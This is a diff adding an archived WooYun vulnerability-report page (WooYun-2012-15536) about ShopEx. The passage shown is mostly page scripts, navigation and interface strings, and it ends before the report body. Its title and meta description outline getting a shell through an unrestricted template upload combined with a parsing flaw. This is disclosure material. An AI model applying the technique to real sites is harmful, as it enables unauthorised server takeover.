@@ -1,0 +1,1539 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<meta http-equiv="x-ua-compatible" content="ie=7"/>
+<title> shopex官方演示后台得到shell与任意文件遍历突破 | WooYun-2012-15536 | WooYun.org </title>
+<meta name="author" content="80sec"/>
+<meta name="copyright" content="http://www.wooyun.org/"/>
+<meta name="keywords" content="ShopEx漏洞,lucifer,文件上传导致任意代码执行,wooyun,应用安全,web安全,系统安全,网络安全,漏洞公布,漏洞报告,安全资讯。"/>
+<meta name="description" content="shopex演示后台模板编辑功能未限制上传导致可利用解析漏洞建立php.php形式的文件夹获得shell|WooYun是一个位于厂商和安全研究者之间的漏洞报告平台,注重尊重,进步,与意义"/>
+<link rel="icon" href="http://wooyun.org/favicon.ico" sizes="32x32" />
+<link href="../css/style.css?v=201501291909" rel="stylesheet" type="text/css"/>
+<script src="https://static.wooyun.org/static/js/jquery-1.4.2.min.js" type="text/javascript"></script>
+</head>
+
+<body id="bugDetail">
+
+<style>
+#myBugListTab { position:relative; display:inline; border:none }
+#myBugList { position:absolute; display:none; margin-left:309px; * margin-left:-60px; * margin-top:18px ; border:#c0c0c0 1px solid; padding:2px 7px; background:#FFF }
+#myBugList li { text-align:left }
+</style>
+<script type="text/javascript">
+$(document).ready(function(){
+
+	if ( $("#__cz_push_d_object_box__") ) {
+		$("script[src^='http://cip4.czpush.com/']").attr("src"," ").remove();
+		$("#__cz_push_d_object_box__").empty().remove();
+		$("a[id^='__czUnion_a']").attr("href","#").remove();
+	}
+
+	if ( $("#ooDiv") ) {
+		$("#ooDiv").empty().parent("div").remove();
+	}
+
+	$("#myBugListTab").toggle(
+		function(){
+			$("#myBugList").css("display","block");
+		},
+		function(){
+			$("#myBugList").css("display","none");
+		}
+	);
+
+	if ( $(window).scrollTop() > 120 ) {
+		$("#back-to-top").fadeIn(300);
+	} else {
+		$("#back-to-top").fadeOut(300);
+	} 
+
+	$(window).scroll(function(){
+		if ( $(window).scrollTop() > 120 ) {
+			$("#back-to-top").fadeIn(300);
+		} else {
+			$("#back-to-top").fadeOut(300);
+		} 
+	});
+
+	$("#back-to-top a").click(function() {
+		$('body,html').animate({scrollTop:0},300);
+		return false;
+	});
+
+	$("#go-to-comment a").click(function() {
+		var t = $("#replys").offset().top - 52;
+		$('body,html').animate({scrollTop:t},300);
+		return false;
+	});
+
+});
+
+function gofeedback(){
+	var bugid=$("#fbid").val();
+	if(bugid){
+		var url="/feedback.php?bugid="+bugid;
+	}else{
+		var url="/feedback.php"
+	}
+	window.open(url);
+}
+</script>
+
+	<div class="go-to-wrapper">
+		<ul class="go-to">
+		    <li id="go-to-comment" title="转到评论"><a href="wooyun-2012-015536#">转到评论</a></li>
+		    <li id="go-to-feedback" title="我要反馈"><a href="javascript:void(0)" onclick="gofeedback()">我要反馈</a></li>
+		    <li id="back-to-top" title="回到顶部"><a href="wooyun-2012-015536#">回到顶部</a></li>
+		</ul>
+	</div>
+	<div class="banner">
+		<div class="logo">
+		<h1>WooYun.org</h1>
+		<div class="weibo"><iframe width="136" height="24" frameborder="0" allowtransparency="true" marginwidth="0" marginheight="0" scrolling="no" border="0" src="http://widget.weibo.com/relationship/followbutton.php?language=zh_cn&width=136&height=24&uid=1981622273&style=2&btn=red&dpc=1"></iframe>
+		</div>
+		<div class="wxewm">
+			<a class="ewmthumb" href="javascript:void(0)"><span><img src="https://static.wooyun.org/static/images/ewm.jpg"width="220" border="0"></span><img src="https://static.wooyun.org/static/images/weixin_30.png"width="22" border="0"></a>
+		</div>
+		</div>
+		
+				<div class="login">
+					<a href="http://wooyun.org/user.php?action=login">登录</a> | <a href="http://wooyun.org/user.php?action=register" class="reg">注册</a>
+				</div>
+				</div>
+
+	<div class="nav" id="nav_sc">
+		<ul>
+			<li><a href="http://wooyun.org/index.php">首页</a></li>
+			<li><a href="http://wooyun.org/corps/">厂商列表</a></li>
+			<li><a href="http://wooyun.org/whitehats/">白帽子</a></li>
+			<li><a href="http://wooyun.org/top/">乌云榜</a></li> 
+            <li><a href="http://wooyun.org/teams/">团队</a></li>
+            <li><a href="http://wooyun.org/bugs/">漏洞列表</a></li>
+			<li class="new"><a href="http://wooyun.org/bug/submit">提交漏洞</a></li>
+			<!--li><a href="/corp_actions">厂商活动</a></li-->
+			<!--<li><a target='_blank' href="http://security.wooyun.org/">安全中心</a></li>-->
+			<li><a href="http://summit.wooyun.org" target="_blank" style="color:rgb(246,172,110);font-size:14px;font-weight:blod">乌云峰会</a></li>
+			<!--li><a href="/job/">企业招聘</a></li-->
+						<li><a href="http://job.wooyun.org" target="_blank">乌云招聘</a></li>
+						<li><a href="http://drops.wooyun.org" target="_blank">知识库</a></li>
+						<li><a href="http://wooyun.org/notice/">公告</a></li>
+		</ul>
+        <form action="http://wooyun.org/searchbug.php" method="post" id="searchbox">
+            <input type="text" name="q" id="search_input" />
+            <input type="submit" value="搜索" id="search_button" />
+        </form>
+	</div>
+
+	<div class="bread" style="padding-top: 4px;">
+		<div style="float:left">当前位置：<a href="http://wooyun.org/index.php">WooYun</a> >> <a href="wooyun-2012-015536#">漏洞信息</a></div>
+			</div><script language="javascript">
+var _LANGJS = {"COMMENT_LIKE_SELF":"\u4e0d\u80fd\u81ea\u5df1\u8d5e\u81ea\u5df1\u7684\u8bc4\u8bba","COMMENT_LIKED":"\u5df2\u8d5e\u6b64\u8bc4\u8bba","COMMENT_NOT":"\u6b64\u8bc4\u8bba\u4e0d\u5b58\u5728","COMMENT_FILL":"\u8bf7\u8f93\u5165\u8bc4\u8bba\u5185\u5bb9","COMMENT_STAT":"\u8bc4\u8bba\u4e0d\u80fd\u4e3a\u7a7a","COMMENT_LOGIN":"\u767b\u9646\u540e\u624d\u80fd\u8bc4\u8bba","COMMENT_GOOD_DONE":"\u5df2\u8d5e\u8fc7\u6b64\u6761\u8bc4\u8bba","COMMENT_SELF":"\u4e0d\u80fd\u8bc4\u4ef7\u81ea\u5df1\u53d1\u5e03\u7684\u8bc4\u8bba","COMMENT_CLICK_FILL":"\u70b9\u51fb\u8f93\u5165\u8bc4\u8bba\u5185\u5bb9","FAIL":"\u64cd\u4f5c\u5931\u8d25","FAIL_MANAGE":"\u64cd\u4f5c\u5931\u8d25\uff0c\u8bf7\u4e0e\u7ba1\u7406\u5458\u8054\u7cfb","FAIL_NO_WHITEHATS":"\u64cd\u4f5c\u5931\u8d25\uff0c\u6ca1\u6709\u6b64\u767d\u5e3d\u5b50","FAIL_NO_CORPS":"\u64cd\u4f5c\u5931\u8d25\uff0c\u6ca1\u6709\u6b64\u5382\u5546","BUGS_CORPS_SELECT":"\u9009\u62e9\u5382\u5546(\u53ef\u8f93\u5165\u5173\u952e\u5b57\u641c\u7d22)","BUGS_CORPS_OTHER":"Other\/\u5176\u5b83\u5382\u5546","BUGS_CORPS_TYPE_STAT":"\u8be5\u6f0f\u6d1e\u5bf9\u5e94\u5382\u5546\u7684\u7c7b\u578b","BUGS_CORPS_NAME_STAT":"\u8be5\u6f0f\u6d1e\u5bf9\u5e94\u5382\u5546\u7684\u540d\u79f0","BUGS_TYPE_STAT":"\u8be5\u6f0f\u6d1e\u7684\u7c7b\u578b\uff0c\u4e71\u9009\u6263\u5206","BUGS_TITLE_STAT":"\u8be5\u6f0f\u6d1e\u7684\u6807\u9898","BUGS_HARMLEVEL_STAT":"\u8be5\u6f0f\u6d1e\u7684\u5371\u5bb3\u7b49\u7ea7","BUGS_DESCRIPTION_STAT":"\u5bf9\u6f0f\u6d1e\u7684\u7b80\u8981\u63cf\u8ff0\uff0c\u53ef\u4ee5\u7b80\u5355\u63cf\u8ff0\u6f0f\u6d1e\u7684\u5371\u5bb3\u548c\u6210\u56e0\uff0c\u4e0d\u8981\u900f\u6f0f\u6f0f\u6d1e\u7684\u7ec6\u8282","BUGS_CONTENT_STAT":"\u5bf9\u6f0f\u6d1e\u7684\u8be6\u7ec6\u63cf\u8ff0\uff0c\u8bf7\u5c3d\u91cf\u591a\u7684\u6df1\u5165\u7ec6\u8282\u4ee5\u65b9\u4fbf\u5bf9\u6f0f\u6d1e\u7684\u7406\u89e3\uff0c\u652f\u6301&lt;code>&lt;\/code>\u6807\u7b7e","BUGS_POC_STAT":"\u7ed9\u51fa\u95ee\u9898\u7684\u6982\u5ff5\u6027\u8bc1\u660e\uff0c\u652f\u6301&lt;code>&lt;\/code>\u6807\u7b7e","BUGS_PATCH_STAT":"\u5efa\u8bae\u7684\u6f0f\u6d1e\u4fee\u590d\u65b9\u6848\uff0c\u652f\u6301&lt;code>&lt;\/code>\u6807\u7b7e","BUGS_TEST_STAT":"\u7ed9\u51fa\u95ee\u9898\u7684\u6807\u51c6\u6d4b\u8bd5\u4ee3\u7801\u4ee5\u66f4\u4e3a\u65b9\u4fbf\u7684\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u6d4b\u8bd5\u548c\u9a8c\u8bc1\uff0c\u6d4b\u8bd5\u4ee3\u7801\u5bf9\u5916\u9ed8\u8ba4\u4e0d\u663e\u793a\uff0c<br\/>\u5176\u4ed6\u767d\u5e3d\u5b50\u652f\u4ed8\u4e4c\u4e91\u5e01\u67e5\u770b\u540e\u4f60\u5c06\u83b7\u5f97\u989d\u5916\u4e4c\u4e91\u5e01\uff0c<br\/>\u540c\u65f6\u4e5f\u5c06\u5728\u4f60\u7684\u4e2a\u4eba\u9875\u9762\u4f53\u73b0\u4f60\u7684\u6d4b\u8bd5\u4ee3\u7801\u7f16\u5199\u80fd\u529b\u3002","BUGS_QUESTION_SELECT":"\u8bf7\u9009\u62e9\u95ee\u9898\u5382\u5546","BUGS_TITLE_NOTICE":"\u6f0f\u6d1e\u6807\u9898\u4e0d\u80fd\u4e3a\u7a7a","BUGS_RANK_NOTICE1":"\u8bf7\u586b\u5199\u81ea\u8bc4Rank","BUGS_RANK_NOTICE2":"\u81ea\u8bc4Rank\u4e3a\u5927\u4e8e0\u7684\u6570\u5b57","BUGS_TYPE_SELECT":"\u8bf7\u9009\u62e9\u6f0f\u6d1e\u7c7b\u578b","BUGS_TYPE_NOTICE":"\u8bf7\u586b\u5199\u6f0f\u6d1e\u7c7b\u578b","BUGS_HARMLEVEL_SELECT":"\u9009\u62e9\u6f0f\u6d1e\u7b49\u7ea7","BUGS_HARMLEVEL_NOTICE":"\u8bf7\u9009\u62e9\u6f0f\u6d1e\u7b49\u7ea7","BUGS_HARMLEVEL_LOWER":"\u6f0f\u6d1e\u7b49\u7ea7\u4e3a \u4f4e \u65f6\uff0c\u81ea\u8bc4Rank\u4e3a1-5","BUGS_HARMLEVEL_MIDDLE":"\u6f0f\u6d1e\u7b49\u7ea7\u4e3a \u4e2d \u65f6\uff0c\u81ea\u8bc4Rank\u4e3a5-10","BUGS_HARMLEVEL_HIGH":"\u6f0f\u6d1e\u7b49\u7ea7\u4e3a \u9ad8 \u65f6\uff0c\u81ea\u8bc4Rank\u4e3a10-20","BUGS_AREA_SELECT":"\u8bf7\u9009\u62e9\u5730\u533a\uff01","BUGS_DOMAILS":"\u6f0f\u6d1e\u6240\u5728\u57df\u540d(\u5982qq.com)","BUGS_DOMAIN_FILL":"\u8bf7\u586b\u5199\u57df\u540d\uff01","BUGS_DETAIL_MORE":"\u67e5\u770b\u8be6\u60c5","BUGS_IGNORE_DAYS":"\u8ddd\u6f0f\u6d1e\u5ffd\u7565\u8fd8\u6709","BUGS_CONFIRM_QUICK":"\u8bf7\u5382\u5546\u5c3d\u5feb","BUGS":"\u6f0f\u6d1e","BUGS_PUBLIC_DAYS":"\u8ddd\u6f0f\u6d1e\u5411\u516c\u4f17\u516c\u5f00\u8fd8\u6709","BUGS_IGNORE_PUBLIC_DAYS":"\u8ddd\u6f0f\u6d1e\u672a\u786e\u8ba4\u65e0\u5f71\u54cd\u5ffd\u7565\u8fd8\u6709","BUGS_REPAIR_QUICK":"\u8bf7\u5382\u5546\u5c3d\u5feb\u4fee\u590d\u6f0f\u6d1e","BUGS_HARMLEVEL_REMIND":"\u8bf7\u9009\u62e9\u5371\u5bb3\u7b49\u7ea7","BUGS_RANK_STAT":"rank\u4e3a1-20\u7684\u6b63\u6574\u6570","BUGS_RANK_STAT1":"rank\u4e3a1-5\u7684\u6b63\u6574\u6570","BUGS_RANK_STAT2":"rank\u4e3a5-10\u7684\u6b63\u6574\u6570","BUGS_RANK_STAT3":"rank\u4e3a10-20\u7684\u6b63\u6574\u6570","BUGS_COMPLEMENT_REASON":"\u6dfb\u52a0\u5bf9\u6f0f\u6d1e\u7684\u8865\u5145\u8bf4\u660e\u4ee5\u53ca\u505a\u51fa\u8bc4\u4ef7\u7684\u7406\u7531","BUGS_REPLY_FILL":"\u8bf7\u586b\u5199\u6f0f\u6d1e\u56de\u590d","BUGS_IGNORE_CONFIRM":"\u786e\u5b9a\u5ffd\u7565\u6b64\u6f0f\u6d1e\u5417","BUGS_STATUS_NEW_UPDATE":"\u66f4\u6539\u6f0f\u6d1e\u7684\u6700\u65b0\u72b6\u6001","BUGS_STATUS_FILL":"\u8bf7\u586b\u5199\u6f0f\u6d1e\u72b6\u6001","BUGS_PUBLIC_ADVANCE":"\u786e\u5b9a\u63d0\u524d\u516c\u5f00\u6b64\u6f0f\u6d1e\u5417","BUGS_COUNT":"\u6f0f\u6d1e\u6570","BUGS_REPLY_HAT":"\u56de\u590d\u6b64\u4eba","BUGS_DELAY_CONFIRM":"\u786e\u5b9a\u8981\u5ef6\u671f\u4e48?","BUGS_DELAY":"\u7533\u8bf7\u5ef6\u671f","BUGS_DELAY_DONE":"\u5df2\u7ecf\u5ef6\u671f","BUGS_RISK_CONFIM":"\u786e\u5b9a\u6b64\u6f0f\u6d1e\u4e3a\u9ad8\u5371\u5417?","BUGS_NULL_EDITE":"\u7559\u7a7a\u8868\u793a\u4e0d\u4fee\u6539","BUGS_DONE_CONFIRM":"\u8be5\u64cd\u4f5c\u6682\u65f6\u4e0d\u53ef\u9006\uff0c\u786e\u5b9a\uff1f","BUGS_UPUBLIC":"\u4f60\u4ece\u53d1\u5e03\u7684\u6f0f\u6d1e","BUGS_UPUBLIC1":"\u91cc\u53c8\u83b7\u5f97\u4e86","BUGS_PRECHECK":"\u6709\u4eba\u63d0\u524d\u67e5\u770b\u4e86\u4f60\u53d1\u5e03\u7684\u6f0f\u6d1e","BUGS_PRECHECK_UNPUBLIC":"\u63d0\u524d\u67e5\u770b\u672a\u516c\u5f00\u6f0f\u6d1e","BUGS_NUM":"\u6f0f\u6d1e\u6570\u91cf","RANKAVG":"\u4eba\u5747\u8d21\u732e Rank","CAPTCHA_GET":"\u83b7\u53d6\u9a8c\u8bc1\u7801","CAPTCHA_FILL":"\u8bf7\u8f93\u5165\u56fe\u7247\u4e2d\u7684\u9a8c\u8bc1\u7801","CAPTCHA_NULL":"\u9a8c\u8bc1\u7801\u4e0d\u80fd\u4e3a\u7a7a","CAPTCHA_ERROR":"\u9a8c\u8bc1\u7801\u8f93\u5165\u9519\u8bef","CAPTCHA_PHONE_ERROR":"\u624b\u673a\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e","CAPTCHA_PHONE_SEND":"\u9a8c\u8bc1\u7801\u5df2\u53d1\u9001\u5230\u4f60\u7684\u624b\u673a\u4e0a\u8bf7\u6ce8\u610f\u67e5\u6536","CAPTCHA_SEND_AGAIN":"\u540e\u53ef\u91cd\u53d1","CAPTCHA_SEND_OVER":"\u77ed\u4fe1\u5df2\u53d1\u9001\u6210\u529f,\u9a8c\u8bc1\u7801\u533a\u5206\u5927\u5c0f\u5199","CAPTCHA_PHONE_NO":"\u4e0d\u9700\u8981\u77ed\u4fe1\u9a8c\u8bc1\u7801","CAPTCHA_PHONE_NULL":"\u77ed\u4fe1\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a","PHONE_TYPE_ERROR":"\u7535\u8bdd\u683c\u5f0f\u4e0d\u5bf9","PHONE_NOTING":"\u7535\u8bdd\u4e0d\u80fd\u4e3a\u7a7a","PHONE_FILL":"\u8bf7\u586b\u5199\u624b\u673a\u53f7","PHONE_CAPTCHA_NOTING":"\u624b\u673a\u9a8c\u8bc1\u7801\u4e0d\u80fd\u4e3a\u7a7a","PASSWORD_NOTING":"\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a","PASSWORD_CONFIRM_NOTING":"\u5bc6\u7801\u786e\u8ba4\u4e0d\u80fd\u4e3a\u7a7a","PASSWORD_PAY_LESS":"\u652f\u4ed8\u5bc6\u7801\u4e0d\u80fd\u5c11\u4e8e6\u4f4d","PASSWORD_FILL_DIFFERENT":"\u8f93\u5165\u7684\u4e24\u6b21\u5bc6\u7801\u4e0d\u4e00\u6837","PASSWORD_PAY_LOGIN_SAME":"\u652f\u4ed8\u5bc6\u7801\u4e0d\u80fd\u540c\u767b\u9646\u5bc6\u7801\u4e00\u6837","PASSWORD_PAY_FILL":"\u8bf7\u586b\u5199\u652f\u4ed8\u5bc6\u7801","PASSWORD_LENGH_LESS":"\u5bc6\u7801\u957f\u5ea6\u4e0d\u80fd\u5c0f\u4e8e6\u4f4d","PASSWORD_SEND_OK":"\u53d1\u9001\u5bc6\u7801\u90ae\u4ef6\u6210\u529f","PASSWORD_OFER_WRROR":"\u60a8\u63d0\u4f9b\u7684\u627e\u56de\u5bc6\u7801\u4fe1\u606f\u4e0d\u6b63\u786e","PASSWORD_OLD_ERROR":"\u539f\u5bc6\u7801\u9519\u8bef","PASSWORD_UPDATE_OK":"\u5bc6\u7801\u4fee\u6539\u6210\u529f","EMAILL_USED":"\u90ae\u7bb1\u5df2\u88ab\u5360\u7528","EMAILL_NULL":"\u90ae\u7bb1\u4e0d\u80fd\u4e3a\u7a7a\uff01","NOTING":"\u65e0","LEAVEWORDS_NULL":"\u7559\u8a00\u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a","LOGIN_FIRST":"\u8bf7\u5148\u767b\u5f55","CONFIRM":"\u786e\u8ba4","YEAR":"\u5e74","DAYS":"\u5929","HOURS":"\u65f6","HOUR":"\u5c0f\u65f6","MINUTE":"\u5206","SECOND":"\u79d2","IS":"\u4e3a","ONE":"\u4e00","TWE":"\u4e8c","TIMES":"\u6b21","COUNTENT_UPDATE_FILL":"\u8bf7\u586b\u5199\u4fee\u6539\u5185\u5bb9","CANCLE":"\u53d6\u6d88","OPERATE_CONFIRM":"\u786e\u5b9a\u6b64\u64cd\u4f5c\u5417\uff1f","USERNAME":"\u59d3\u540d","SUCCESS":"\u64cd\u4f5c\u6210\u529f","FAIL_REPLY":"\u64cd\u4f5c\u5931\u8d25\uff0c\u8bf7\u586b\u5199\u56de\u590d\u4fe1\u606f","SEND_OK":"\u53d1\u9001\u6210\u529f","PHONE_BIND_DONE":"\u5df2\u7ed1\u5b9a","TAGS_USE":"\u4f7f\u7528\u6b64\u6807\u7b7e","WHITEHATS":"\u767d\u5e3d\u5b50","WHITEHATS_VERTIFY":"\u8ba4\u8bc1\u767d\u5e3d\u5b50","WHITEHATES_NAME":"\u8bf7\u8f93\u5165\u767d\u5e3d\u5b50\u7528\u6237\u540d","USER_ZONE_EDIT":"\u7f16\u8f91\u9886\u57df","WB_TRANSFER":"\u6211\u8981\u8f6c\u8d26","WB_TRANSFER_CANCEL":"\u53d6\u6d88\u8f6c\u8d26","WB_NUM":"\u8bf7\u8f93\u5165\u4e4c\u4e91\u5e01\u6570\u91cf","WB_NUMBER":"\u4e4c\u4e91\u5e01\u6570\u91cf\u4e3a\u6b63\u6574\u6570","WB_NEED_LESS":"\u81f3\u5c11\u9700\u8981","WB_NEED_SUM":"\u4e2a\u4e4c\u4e91\u5e01","WB_TRANSFER_OK":"\u8f6c\u8d26\u6210\u529f","WB_MY":"\u6211\u7684\u4e4c\u4e91\u5e01","WB_CAN_USE":"\u53ef\u7528\u7684\u4e4c\u4e91\u5e01","WB_FROZEN":"\u51bb\u7ed3\u7684\u4e4c\u4e91\u5e01","WB_LACK":"\u4e4c\u4e91\u5e01\u4e0d\u8db3","WB_SET_SCOPE":"\u51fa\u4ef7\u8303\u56f4\u4e3a","WB_BIND_CANCEL_STAT":"(\u70b9\u51fb\u201c\u53d6\u6d88\u7ed1\u5b9a\u201d\u83b7\u53d6\u9a8c\u8bc1\u7801\uff0c\u5411\u4e4c\u4e91\u516c\u4f17\u8d26\u53f7\u53d1\u9001\u9a8c\u8bc1\u7801\u53d6\u6d88\u5fae\u4fe1\u7ed1\u5b9a\uff0c\u7136\u540e\u5237\u65b0\u672c\u9875\u9762)","EMAIL_LOGIN_MEXT":"\u90ae\u4ef6\u53d1\u9001\u6210\u529f,\u8bf7\u767b\u9646\u60a8\u7684\u90ae\u7bb1\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c","EMAIL_UPDATE_LOGIN_MEXT":"\u66f4\u6539\u8bf7\u6c42\u5df2\u53d1\u9001\u5230\u90ae\u7bb1,\u8bf7\u767b\u9646\u60a8\u7684\u90ae\u7bb1\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c","EMAIL_SEND_OK":"\u90ae\u4ef6\u53d1\u9001\u6210\u529f\uff01","CORPS":"\u5382\u5546","TEAM_NAME_NULL":"\u56e2\u961f\u540d\u79f0\u4e0d\u80fd\u4e3a\u7a7a","TEAM_HOMEPAGE_NULL":"\u56e2\u961f\u4e3b\u9875\u4e0d\u80fd\u4e3a\u7a7a","TEAM_QQ_NULL":"\u56e2\u961fqq\u4e0d\u80fd\u4e3a\u7a7a","TEAM_BRIEF_NULL":"\u56e2\u961f\u7b80\u4ecb\u4e0d\u80fd\u4e3a\u7a7a","TEAM_EXIST":"\u56e2\u961f\u5df2\u5b58\u5728","TEAM_DISMISS_CONFIRM":"\u786e\u5b9a\u89e3\u6563\u672c\u56e2\u961f\u5417?","TEAM_NAME":"\u56e2\u961f\u540d\u79f0","TEAM_CREATER":"\u521b\u5efa\u4eba","TEAM_DONATER":"\u56e2\u961f\u4e3b\u529b","TEAM_MUMBER":"\u4eba\u6570","TEAM":"\u56e2\u961f","REGISTER_BRIEF":"*\u8bf7\u8f93\u5165\u4e2a\u4eba\u7684\u7b80\u8981\u4ecb\u7ecd","REGISTER_TYPE":"*\u9009\u62e9\u6ce8\u518c\u7c7b\u578b","REGISTER_CORPS_BRIEF":"*\u8f93\u5165\u5382\u5546\u7684\u7b80\u8981\u4ecb\u7ecd","REGISTER_EMAIL":"*\u5382\u5546\u90ae\u4ef6\u5fc5\u987b\u4e3a\u4f01\u4e1a\u4f7f\u7528\u7684\u6b63\u5f0f\u90ae\u4ef6","REGISTER_NAME_NULL":"\u7528\u6237\u540d\u4e0d\u80fd\u4e3a\u7a7a","REGISTER_HOMEPAGE_NULL":"\u4e2a\u4eba\u4e3b\u9875\u4e0d\u80fd\u4e3a\u7a7a","REGISTER_BREIF_NULL":"\u7b80\u8981\u4ecb\u7ecd\u4e0d\u80fd\u4e3a\u7a7a","REGISTER_CORPNAME_NULL":"\u5382\u5546\u540d\u79f0\u4e0d\u80fd\u4e3a\u7a7a","REGISTER_CORPHOMEPAGE_NULL":"\u5b98\u65b9\u4e3b\u9875\u4e0d\u80fd\u4e3a\u7a7a","REGISTER_LAW_AGREE":"\u540c\u610f\u300a\u4fe1\u606f\u5b89\u5168\u76f8\u5173\u4fdd\u62a4\u548c\u58f0\u660e\u300b\u624d\u80fd\u6ce8\u518c","ATTENTION":"\u5173\u6ce8","ATTENTION_SUM":"\u5173\u6ce8\u6570","ATTENTION_DONE":"\u5df2\u5173\u6ce8","ATTENTION_CANCEL":"\u53d6\u6d88\u5173\u6ce8","ATTENTION_BUG_DONE":"\u5df2\u5173\u6ce8\u6b64\u6f0f\u6d1e","ATTENTION_BUG_CONFIRM":"\u786e\u5b9a\u53d6\u6d88\u5bf9\u6b64\u6f0f\u6d1e\u7684\u5173\u6ce8","ATTENTION_BUG":"\u5173\u6ce8\u6b64\u6f0f\u6d1e","ATTENTION_BUG_UNDO":"\u6ca1\u6709\u5173\u6ce8\u6b64\u6f0f\u6d1e","ATTENTION_HAT_DONE":"\u5df2\u5173\u6ce8\u6b64\u767d\u5e3d\u5b50","ATTENTION_HAT_CONFIRM":"\u786e\u5b9a\u53d6\u6d88\u5bf9\u6b64\u767d\u5e3d\u5b50\u7684\u5173\u6ce8?","COLLECTION":"\u6536\u85cf","COLLECTION_DONE":"\u5df2\u6536\u85cf","COLLECTION_BUG_DONE":"\u5df2\u6536\u85cf\u6b64\u6f0f\u6d1e","COLLECTION_BUG_UNDO":"\u6ca1\u6709\u6536\u85cf\u6b64\u6f0f\u6d1e","COLLECTION_BUG_CONFIRM":"\u786e\u5b9a\u53d6\u6d88\u5bf9\u6b64\u6f0f\u6d1e\u7684\u6536\u85cf","SMS_SEND_NAME":"* \u7528\u6237\u6635\u79f0\/\u5382\u5546\u540d\u79f0\u4e0d\u80fd\u4e3a\u7a7a<br \/>","SMS_SEND_TITLE":"* \u6807\u9898\u4e0d\u80fd\u4e3a\u7a7a<br \/>","SMS_SEND_CONTENT":"* \u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a<br \/>","SMS_SEND_CAPTCHA":"* \u9a8c\u8bc1\u7801\u4e0d\u80fd\u4e3a\u7a7a<br \/>","NUMBER":"\u7684\u6b63\u6574\u6570","RATING_SUCCESS":"\u8bc4\u5206\u6210\u529f","RATING_BUGS_DONE":"\u5df2\u5bf9\u6b64\u6f0f\u6d1e\u8fdb\u884c\u8fc7\u8bc4\u5206","RATING_BUGS_SELF":"\u4e0d\u80fd\u5bf9\u81ea\u5df1\u53d1\u5e03\u7684\u6f0f\u6d1e\u8fdb\u884c\u8bc4\u5206","RATING_SUBMIT_CANCLE":"\u53d6\u6d88\u63d0\u4ea4\u8bc4\u5206","RATING_SUBMIT":"\u63d0\u4ea4\u6211\u7684\u8bc4\u5206","RATING_SUBMIT_CHECK":"\u8bf7\u786e\u5b9a\u6bcf\u4e00\u9879\u90fd\u9009\u62e9\u4e86\u8bc4\u5206","RATING_CONFIRM":"\u786e\u5b9a\u63d0\u4ea4\u5bf9\u6b64\u5382\u5546\u7684\u8bc4\u5206\u5417\uff1f","RATING_LOGIN":"\u53ea\u6709\u767b\u5f55\u7684\u767d\u5e3d\u5b50\u624d\u80fd\u8bc4\u5206","RATING_DONE":"\u5df2\u7ecf\u8bc4\u8fc7\u5206\u4e86","WOOYUN_CORPS":"\u4e4c\u4e91\u5382\u5546","MARST_IMAGE":"\u5bf9\u56fe\u7247\u6253\u7801","FEEDBACK_LINK_NULL":"\u94fe\u63a5\u4e0d\u80fd\u4e3a\u7a7a\uff01","FEEDBACK_LINK_ERROR":"\u8bf7\u4e66\u5199\u6b63\u786e\u7684\u94fe\u63a5\u5730\u5740\uff01","FEEDBACK_CONTENT_NULL":"\u95ee\u9898\u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a\uff01","FEEDBACK_ALLOW_LIMIT":"\u534a\u5c0f\u65f6\u53ea\u5141\u8bb8\u53cd\u9988\u4e00\u6b21","TOP_RANK":"\u6392\u540d","TOP_BUG_TITLE":"\u6f0f\u6d1e\u6807\u9898","TOP_RANK_NONE":"\u6682\u65e0\u6392\u540d","TOP_BUGS_GOOD":"\u4f18\u8d28\u6f0f\u6d1e\u6570","NICKNAME":"\u6635\u79f0","LEVEL":"\u7b49\u7ea7","VALUE":"\u503c","EDITOR_INSERT_PIC":"\u63d2\u5165\u56fe\u7247","EDITOR_PIC_ADDR":"\u5730\u5740\uff1a","EDITOR_CONFIRM":"\u786e\u5b9a","EDITOR_PIC_NULL":"\u8bf7\u4e0a\u4f20\u56fe\u7247\u6216\u586b\u5199\u56fe\u7247\u5730\u5740","EDITOR_INSERT_VIDIO":"\u63d2\u5165\u89c6\u9891","EDITOR_VIDIO_ADDR":"\u89c6\u9891\u5730\u5740\uff1a","EDITOR_VIDIO_NULL":"\u8bf7\u586b\u5199\u89c6\u9891\u5730\u5740(.swf)","EDITOR_VIDIO_TYPE":"\u76ee\u524d\u4ec5\u652f\u6301.swf\u683c\u5f0f","PIC_SELECT":"\u8bf7\u9009\u62e9\u5f85\u4e0a\u4f20\u7684\u56fe\u7247","PIC_TYPE_IS":"\u56fe\u7247\u7c7b\u578b\u4e3a","UPLOAD":"\u4e0a\u4f20","RANK_AVG":"\u6f0f\u6d1e\u5e73\u5747"};
+
+$(function(){
+    function getParamsOfShareWindow(width, height) {
+        return ['toolbar=0,status=0,resizable=1,width=' + width + ',height=' + height + ',left=',(screen.width-width)/2,',top=',(screen.height-height)/2].join('');
+    }
+});
+
+function errimg(img){
+	tmp=img.src;
+	nimg=tmp.replace("http://wooyun.org/","http://www.wooyun.org/");
+	img.src=nimg;
+	$(img).parent().attr('href',nimg);
+	img.onerror=null;
+}
+function AttendBug(id){
+	$.get('/ajaxdo.php',{module:'attendbug',id:id,rid:Math.random(),token:$("#token").val()},function(re){
+		if(re==1){
+			$("#attention_num").html(parseInt($("#attention_num").html())+1);
+			$("#attend_action").html('√'+_LANGJS.ATTENTION_DONE+' <a class="btn" href="javascript:void(0)" onclick="AttendCancel('+id+')">'+_LANGJS.ATTENTION_CANCEL+'</a></span>');
+		}else if(re==2){
+			alert(_LANGJS.LOGIN_FIRST);
+		}else if(re==3){
+			alert(_LANGJS.ATTENTION_BUG_DONE);
+		}else{
+			alert(_LANGJS.FAIL_MANAGE);
+		}
+	});
+}
+function AttendCancel(id){
+	if(confirm(_LANGJS.ATTENTION_BUG_CONFIRM+"?")){
